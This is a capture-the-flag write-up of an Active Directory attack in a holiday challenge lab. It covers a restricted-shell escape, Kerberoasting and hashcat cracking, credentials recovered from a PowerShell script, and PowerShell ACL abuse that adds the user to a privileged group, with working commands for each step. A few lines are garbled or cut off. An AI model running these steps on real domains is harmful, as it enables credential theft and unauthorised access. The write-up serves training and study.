# Objective 8: Kerberoasting on an Open Fire
**Location: Staging**  
**Elf: Jingle Ringford**  
**Hints provided by Eve Snowshoes after completion of [HoHo ... No](https://github.com/joergschwarzwaelder/hhc2021/blob/master/Additional/HoHo...No.md)**

The objective to obtain a secret research document.
In order to get an account in the ELFU AD domain, a registration on https://register.elfu.org is required.
After that an individual username and password is provided which can be used to logon to grades.elfu.org using SSH on port 2222.

### Escaping Application
After the SSH login an application is automatically started.
It is possible to escape this application by sending an EOF (CTRL-D).

### Escaping Python Shell
After this a Python shell is displayed.
In order to escape this `os.system.("bash")` has to be submitted in order to get to a normal Unix shell.

### Reconnaissance
An nmap scan of the network 10.128.0.0/22 reveals two hosts providing Windows services: 10.128.1.53 (domain controller) and 10.128.3.30 (samba file server) with the shares `elfu_svc_shr` and `research_dep`.


### Pulling data from AD
Next the tool `ldapdomaindump` can be used in order to get an idea of the user<->group<->permission structure:
```
ldapdomaindump 10.128.1.53 -u 'elfu\{userid}' -p '{password}'
```
This can be done manually or using Bloodhound.
Bloodhound also reveals that the user `elfu_svc` is Kerberoastable.

The password hash for this Kerberoastable user can be obtained by running
```
GetUserSPNs.py -outputfile spns.txt -dc-ip 10.128.1.53 'elfu.local/{userid}:{passwor√∞}' -request
```

### Cracking the Password
We follow the hints and prepare the password cracking as follows:
We prepare a password list using CeWL, keeping in mind that explicitly also digits are valid as per the provided hint:
```
./cewl.rb https://register.elfu.org/register --with-numbers -w wordlist
```
In addition, also following the hint, the OneRuleToRuleThemAll rule for Hashcat is downloaded:
```
curl -OJ https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
```
Equipped with these tools, we can let Hashcat crack the password:
```
hashcat -m 13100 -a0 spn.txt --potfile-disable -r OneRuleToRuleThemAll.rule --force -O -w 4 --opencl-device-types 1,2 wordlist
```

Hashcat finds the password for `elfu_svc` to be `Snow2021!`.

### Access to elfu_svc_shr
With this information we can get access to the elfu_svc_shr file share on 10.128.3.30:
```
smbclient -U elfu_svc '\\10.128.3.30\elfu_svc_shr'
```
On this share are several Powershell scripts. One of them, `GetProcessInfo.ps1`, holds credentials for the user `remote_elf`:
```powershell
$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
```

### Getting into group Research Department
With the `remote_elf` credential snippet from the script, we can grant our windows domain user the `GenericAll` permissions for the group Research Department (based on [scripts](https://github.com/chrisjd20/hhc21_powershell_snippets) provided by Chris Davis, a Kringle Con speaker) :
```powershell
Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
  Add-Type -AssemblyName System.DirectoryServices
  $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
  $username = "{userid}"
  $nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
  $propGUID = [guid]'00000000-0000-0000-0000-000000000000'
  $IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
  $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
  $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
  $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
  $secOptions = $domainDirEntry.get_Options()
  $secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
  $domainDirEntry.RefreshCache()
  $domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
  $domainDirEntry.CommitChanges()
  $domainDirEntry.dispose()
} -Credential $aCred -Authentication Negotiate
```
and add then our user to this group:
```powershell
Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
  Add-Type -AssemblyName System.DirectoryServices
  $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
  $username = "{userid}"
  $password = "{password}"
  $domainDirEntry = New-Object   System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
  $user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
  $sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
  $b=New-Object byte[] $sid.BinaryLength
  $sid.GetBinaryForm($b,0)
  $hexSID=[BitConverter]::ToString($b).Replace('-','')
  $domainDirEntry.Add("LDAP://<SID=$hexSID>")
  $domainDirEntry.CommitChanges()
  $domainDirEntry.dispose()
} -Credential $aCred -Authentication Negotiate
```
### Access to research_dep share
After a few minutes, our new group membership gets replicated to the samba file server, so that we now have access to the secret document:
```
smbclient '\\10.128.3.30\research_dep'
smb: \> dir
  .                                   D        0  Thu Dec  2 16:39:42 2021
  ..                                  D        0  Fri Dec 24 08:01:27 2021

### Bonus: Automation - Kerberoboting
This whole process was automated in an `expect` [script](https://github.com/joergschwarzwaelder/hhc2021/blob/master/Objective-8/kerberoboting) named `kerberoboting`, so that you can enjoy a brew whilst your computer does the work.
It just requires you to register at https://register.elfu.org, have `hashcat` installed in the PATH and a working CeWL in the local directory:
```
joergen@northpole:~$ ./kerberoboting jsfdgdsjjl 'Ndcopkmbo#'
#
# Kerberoboting in progress - get a brew and lean back
